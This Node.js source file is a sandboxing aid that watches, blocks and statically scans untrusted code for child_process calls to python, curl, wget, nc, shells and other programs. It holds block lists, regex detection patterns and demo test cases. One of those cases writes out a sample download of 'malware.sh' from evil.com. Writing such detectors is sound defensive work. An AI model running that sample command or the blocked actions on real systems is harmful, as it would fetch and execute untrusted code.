/**
 * Detect Non-Node.js Code Execution
 *
 * Multiple approaches to detect when user code tries to execute
 * Python, curl, wget, shell scripts, or other external programs
 */

const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// ============================================================================
// APPROACH 1: Monitor child_process Module
// ============================================================================

class ChildProcessMonitor {
  constructor(config = {}) {
    this.blocked = config.blocked || [];
    this.allowed = config.allowed || [];
    this.logOnly = config.logOnly || false;
    this.executionLog = [];
  }

  generateMonitoredCode(userCode) {
    const logOnly = this.logOnly;
    const blocked = JSON.stringify(this.blocked);
    const allowed = JSON.stringify(this.allowed);

    return `
// CHILD_PROCESS MONITORING - Injected before user code
(function() {
  'use strict';

  const Module = require('module');
  const originalRequire = Module.prototype.require;

  const blockedCommands = ${blocked};
  const allowedCommands = ${allowed};
  const logOnly = ${logOnly};
  const executionLog = [];

  function detectNonNodeCode(command, args = []) {
    const fullCommand = args.length ? \`\${command} \${args.join(' ')}\` : command;

    // Detect by command name
    const suspiciousCommands = [
      'python', 'python3', 'python2',
      'ruby', 'perl', 'php',
      'curl', 'wget', 'nc', 'netcat', 'telnet',
      'bash', 'sh', 'zsh', 'fish',
      'node',  // Spawning another Node.js process
      'npm', 'npx', 'yarn',
      'go', 'rust', 'java', 'gcc', 'make',
      'docker', 'kubectl', 'git'
    ];

    const cmdName = command.split('/').pop().toLowerCase();
    const isSuspicious = suspiciousCommands.some(s => cmdName.includes(s));

    // Detect by command content
    const suspiciousPatterns = [
      /import\\s+(requests|urllib|http)/,  // Python HTTP imports
      /curl\\s+https?:/,                    // curl with URL
      /wget\\s+https?:/,                    // wget with URL
      /\\bfetch\\(/,                        // fetch API
      /\\brequests\\.(get|post)/,           // Python requests
      /\\bhttp\\.client/,                   // Python http.client
    ];

    const hasPattern = suspiciousPatterns.some(p => p.test(fullCommand));

    return {
      isSuspicious: isSuspicious || hasPattern,
      command: cmdName,
      fullCommand,
      reason: isSuspicious ? 'suspicious command' : hasPattern ? 'suspicious pattern' : null
    };
  }

  // Wrap child_process functions
  function wrapChildProcess(originalCP) {
    const wrappedCP = { ...originalCP };

    // Wrap exec
    wrappedCP.exec = function(command, ...args) {
      const detection = detectNonNodeCode(command);

      console.log('[MONITOR] exec() called:');
      console.log('  Command:', command);
      console.log('  Suspicious:', detection.isSuspicious ? 'YES ⚠️' : 'NO');
      if (detection.reason) console.log('  Reason:', detection.reason);

      executionLog.push({
        type: 'exec',
        command,
        timestamp: Date.now(),
        suspicious: detection.isSuspicious
      });

      // Check if blocked
      if (!logOnly && detection.isSuspicious) {
        if (blockedCommands.length === 0 || blockedCommands.some(b => command.includes(b))) {
          throw new Error(\`[SECURITY] Execution of '\${detection.command}' is not allowed\`);
        }
      }

      return originalCP.exec.apply(this, [command, ...args]);
    };

    // Wrap execSync
    wrappedCP.execSync = function(command, ...args) {
      const detection = detectNonNodeCode(command);

      console.log('[MONITOR] execSync() called:');
      console.log('  Command:', command);
      console.log('  Suspicious:', detection.isSuspicious ? 'YES ⚠️' : 'NO');

      executionLog.push({
        type: 'execSync',
        command,
        timestamp: Date.now(),
        suspicious: detection.isSuspicious
      });

      if (!logOnly && detection.isSuspicious) {
        throw new Error(\`[SECURITY] Execution of '\${detection.command}' is not allowed\`);
      }

      return originalCP.execSync.apply(this, [command, ...args]);
    };

    // Wrap spawn
    wrappedCP.spawn = function(command, args, ...rest) {
      const detection = detectNonNodeCode(command, args);

      console.log('[MONITOR] spawn() called:');
      console.log('  Command:', command);
      console.log('  Args:', args);
      console.log('  Suspicious:', detection.isSuspicious ? 'YES ⚠️' : 'NO');

      executionLog.push({
        type: 'spawn',
        command,
        args,
        timestamp: Date.now(),
        suspicious: detection.isSuspicious
      });

      if (!logOnly && detection.isSuspicious) {
        throw new Error(\`[SECURITY] Spawning '\${detection.command}' is not allowed\`);
      }

      return originalCP.spawn.apply(this, [command, args, ...rest]);
    };

    // Wrap execFile
    wrappedCP.execFile = function(file, ...args) {
      const detection = detectNonNodeCode(file);

      console.log('[MONITOR] execFile() called:');
      console.log('  File:', file);
      console.log('  Suspicious:', detection.isSuspicious ? 'YES ⚠️' : 'NO');

      executionLog.push({
        type: 'execFile',
        file,
        timestamp: Date.now(),
        suspicious: detection.isSuspicious
      });

      if (!logOnly && detection.isSuspicious) {
        throw new Error(\`[SECURITY] Executing '\${detection.command}' is not allowed\`);
      }

      return originalCP.execFile.apply(this, [file, ...args]);
    };

    // Wrap fork
    wrappedCP.fork = function(modulePath, ...args) {
      console.log('[MONITOR] fork() called:');
      console.log('  Module:', modulePath);

      executionLog.push({
        type: 'fork',
        modulePath,
        timestamp: Date.now(),
        suspicious: false  // Forking Node.js modules is usually OK
      });

      return originalCP.fork.apply(this, [modulePath, ...args]);
    };

    return wrappedCP;
  }

  // Override require for child_process
  Module.prototype.require = function(id) {
    if (id === 'child_process') {
      const original = originalRequire.call(this, id);
      return wrapChildProcess(original);
    }
    return originalRequire.apply(this, arguments);
  };

  // Export log for retrieval
  global.__executionLog = executionLog;

  console.log('[MONITOR] Child process monitoring enabled');
  console.log('[MONITOR] Mode:', logOnly ? 'LOG ONLY' : 'DETECT & BLOCK');
})();

// USER CODE STARTS HERE
(async () => {
${userCode}
})().catch(err => {
  console.error('Error:', err.message);
  process.exit(1);
}).finally(() => {
  // Print execution log
  if (global.__executionLog && global.__executionLog.length > 0) {
    console.log('\\n[EXECUTION LOG]');
    global.__executionLog.forEach((entry, i) => {
      console.log(\`\\n  #\${i + 1}: \${entry.type}\`);
      console.log(\`      Command: \${entry.command || entry.file || entry.modulePath}\`);
      if (entry.args) console.log(\`      Args: \${entry.args.join(' ')}\`);
      console.log(\`      Suspicious: \${entry.suspicious ? 'YES ⚠️' : 'NO'}\`);
    });
  }
});
    `.trim();
  }

  async executeCode(userCode) {
    const monitoredCode = this.generateMonitoredCode(userCode);
    const tempFile = path.join(__dirname, '../temp', `monitored_${Date.now()}.js`);

    fs.writeFileSync(tempFile, monitoredCode);

    return new Promise((resolve, reject) => {
      let stdout = '';
      let stderr = '';

      const child = spawn('node', [tempFile], {
        env: {
          PATH: process.env.PATH,
          HOME: process.env.HOME
        }
      });

      child.stdout.on('data', data => stdout += data);
      child.stderr.on('data', data => stderr += data);

      child.on('close', (code) => {
        fs.unlinkSync(tempFile);

        resolve({
          success: code === 0,
          output: stdout,
          error: stderr,
          exitCode: code
        });
      });
    });
  }
}

// ============================================================================
// APPROACH 2: Pattern Matching in Code
// ============================================================================

class StaticCodeAnalyzer {
  detectNonNodeExecution(code) {
    const detections = [];

    // Check for child_process imports
    const childProcessPatterns = [
      /require\(['"]child_process['"]\)/,
      /from ['"]child_process['"]/,
      /import.*child_process/
    ];

    if (childProcessPatterns.some(p => p.test(code))) {
      detections.push({
        type: 'module_import',
        severity: 'high',
        message: 'Imports child_process module'
      });
    }

    // Check for specific command patterns
    const commandPatterns = [
      {
        pattern: /exec\s*\(\s*['"`]python/,
        command: 'python',
        severity: 'critical'
      },
      {
        pattern: /exec\s*\(\s*['"`]curl/,
        command: 'curl',
        severity: 'critical'
      },
      {
        pattern: /exec\s*\(\s*['"`]wget/,
        command: 'wget',
        severity: 'critical'
      },
      {
        pattern: /spawn\s*\(\s*['"`]python/,
        command: 'python',
        severity: 'critical'
      },
      {
        pattern: /exec\s*\(\s*['"`]ruby/,
        command: 'ruby',
        severity: 'high'
      },
      {
        pattern: /exec\s*\(\s*['"`]php/,
        command: 'php',
        severity: 'high'
      },
      {
        pattern: /exec\s*\(\s*['"`]bash/,
        command: 'bash',
        severity: 'medium'
      },
      {
        pattern: /exec\s*\(\s*['"`]sh\s/,
        command: 'sh',
        severity: 'medium'
      }
    ];

    commandPatterns.forEach(({ pattern, command, severity }) => {
      if (pattern.test(code)) {
        detections.push({
          type: 'command_execution',
          command,
          severity,
          message: `Attempts to execute '${command}'`
        });
      }
    });

    return {
      safe: detections.length === 0,
      detections,
      risk: this.calculateRisk(detections)
    };
  }

  calculateRisk(detections) {
    if (detections.length === 0) return 'none';

    const hasCritical = detections.some(d => d.severity === 'critical');
    if (hasCritical) return 'critical';

    const hasHigh = detections.some(d => d.severity === 'high');
    if (hasHigh) return 'high';

    return 'medium';
  }
}

// ============================================================================
// DEMO: Test Detection
// ============================================================================

async function demo1_LogOnly() {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('DEMO 1: Log Only Mode (Detect but Don\'t Block)');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  const monitor = new ChildProcessMonitor({
    logOnly: true  // Just log, don't block
  });

  const testCode = `
    const { exec } = require('child_process');

    console.log('\\n[USER CODE] Attempting to execute Python...');
    exec('python3 --version', (err, stdout) => {
      if (err) console.log('Failed:', err.message);
      else console.log('Success:', stdout);
    });

    console.log('\\n[USER CODE] Attempting to execute curl...');
    exec('curl --version', (err, stdout) => {
      if (err) console.log('Failed:', err.message);
      else console.log('Success:', stdout.substring(0, 50) + '...');
    });

    setTimeout(() => {}, 2000);  // Wait for commands
  `;

  const result = await monitor.executeCode(testCode);
  console.log('\n--- Output ---');
  console.log(result.output);
}

async function demo2_BlockMode() {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('DEMO 2: Block Mode (Detect and Block)');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  const monitor = new ChildProcessMonitor({
    logOnly: false,  // Block suspicious commands
    blocked: ['python', 'curl', 'wget']
  });

  const testCode = `
    const { exec } = require('child_process');

    console.log('[USER CODE] Attempting to execute Python...');
    try {
      exec('python3 --version');
    } catch (err) {
      console.log('[USER CODE] BLOCKED:', err.message);
    }

    console.log('[USER CODE] Attempting to execute curl...');
    try {
      exec('curl https://api.stripe.com');
    } catch (err) {
      console.log('[USER CODE] BLOCKED:', err.message);
    }
  `;

  const result = await monitor.executeCode(testCode);
  console.log('\n--- Output ---');
  console.log(result.output);
  if (result.error) {
    console.log('\n--- Errors ---');
    console.log(result.error);
  }
}

async function demo3_StaticAnalysis() {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('DEMO 3: Static Code Analysis (Before Execution)');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  const analyzer = new StaticCodeAnalyzer();

  const testCases = [
    {
      name: 'Safe Code',
      code: `
        const stripe = require('stripe')('sk_test_...');
        await stripe.customers.create({ email: 'test@example.com' });
      `
    },
    {
      name: 'Python Execution',
      code: `
        const { exec } = require('child_process');
        exec('python3 script.py');
      `
    },
    {
      name: 'curl Execution',
      code: `
        const { exec } = require('child_process');
        exec('curl https://api.stripe.com');
      `
    },
    {
      name: 'Multiple Suspicious Commands',
      code: `
        const { exec, spawn } = require('child_process');
        exec('wget https://evil.com/malware.sh');
        spawn('python3', ['attack.py']);
        exec('ruby -e "Net::HTTP.get(URI(\\'https://api.stripe.com\\'))"');
      `
    }
  ];

  testCases.forEach(({ name, code }) => {
    console.log(`\nTest: ${name}`);
    console.log('─'.repeat(50));

    const analysis = analyzer.detectNonNodeExecution(code);

    console.log('Safe:', analysis.safe ? '✅ YES' : '❌ NO');
    console.log('Risk Level:', analysis.risk.toUpperCase());

    if (analysis.detections.length > 0) {
      console.log('\nDetections:');
      analysis.detections.forEach((d, i) => {
        console.log(`  ${i + 1}. ${d.message}`);
        console.log(`     Severity: ${d.severity}`);
      });
    }
  });
}

// ============================================================================
// Run Demos
// ============================================================================

async function runAllDemos() {
  console.log('\n');
  console.log('╔════════════════════════════════════════════════════════════════════════╗');
  console.log('║                                                                        ║');
  console.log('║          Detecting Non-Node.js Code Execution                         ║');
  console.log('║                                                                        ║');
  console.log('╚════════════════════════════════════════════════════════════════════════╝\n');

  await demo1_LogOnly();
  await demo2_BlockMode();
  await demo3_StaticAnalysis();

  console.log('\n');
  console.log('╔════════════════════════════════════════════════════════════════════════╗');
  console.log('║                            SUMMARY                                     ║');
  console.log('╚════════════════════════════════════════════════════════════════════════╝\n');

  console.log('✅ Detection Methods:');
  console.log('   1. Runtime Monitoring: Wrap child_process module');
  console.log('   2. Static Analysis: Scan code before execution');
  console.log('   3. Pattern Matching: Detect suspicious commands\n');

  console.log('🎯 What Can Be Detected:');
  console.log('   • Python execution (python, python3)');
  console.log('   • Shell commands (curl, wget, nc)');
  console.log('   • Other languages (ruby, php, perl)');
  console.log('   • Binary execution');
  console.log('   • Any child_process usage\n');

  console.log('⚙️  Modes:');
  console.log('   • Log Only: Detect and log (for auditing)');
  console.log('   • Block: Detect and prevent execution');
  console.log('   • Static: Analyze before running\n');

  console.log('💡 Recommendation:');
  console.log('   For untrusted code, use Docker instead!');
  console.log('   Detection can be bypassed with obfuscation.\n');
}

module.exports = {
  ChildProcessMonitor,
  StaticCodeAnalyzer
};

if (require.main === module) {
  runAllDemos().catch(console.error);
}
